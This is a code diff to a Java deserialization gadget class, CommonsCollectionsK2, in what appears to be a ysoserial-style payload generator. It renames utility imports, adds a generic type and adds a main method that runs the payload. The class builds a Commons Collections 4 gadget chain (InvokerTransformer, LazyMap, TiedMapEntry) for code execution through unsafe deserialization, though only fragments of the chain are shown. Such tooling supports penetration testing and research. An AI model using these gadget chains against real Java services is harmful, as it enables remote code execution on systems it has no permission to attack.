@@ -1,5 +1,6 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.apache.commons.collections4.keyvalue.TiedMapEntry;
@@ -7,8 +8,8 @@ import org.apache.commons.collections4.map.LazyMap;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -18,7 +19,7 @@ import java.util.Map;
  */
 @Dependencies({"commons-collections:commons-collections4:4.0"})
 @Authors({"KORLR"})
-public class CommonsCollectionsK2 implements ObjectPayload {
+public class CommonsCollectionsK2 implements ObjectPayload<Map> {
 
 	public Map getObject(String command) throws Exception {
 
@@ -32,5 +33,9 @@ public class CommonsCollectionsK2 implements ObjectPayload {
 		innerMap.clear();
 		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
 		return outerMap;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollectionsK2.class, args);
 	}
 }
